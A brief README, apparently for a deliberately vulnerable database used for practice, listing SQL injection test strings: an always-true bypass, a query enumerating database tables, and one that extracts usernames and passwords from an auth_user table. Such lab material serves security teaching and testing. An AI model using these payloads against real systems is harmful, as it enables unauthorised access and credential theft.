#Vulnerable Database

Test sql injection statements to use against the vulnerable database are:
  ' or 1=1-- - 
  
  '; SELECT '1' as part_id,'2' as description,'3' as name,'4' as price, table_name as heavy_use  FROM information_schema.tables  WHERE table_schema='public' AND table_type='BASE TABLE' -- - 
  
  '; SELECT '1' as part_id,'2' as description,'3' as name, username as price, password as heavy_use  FROM auth_user  -- - 
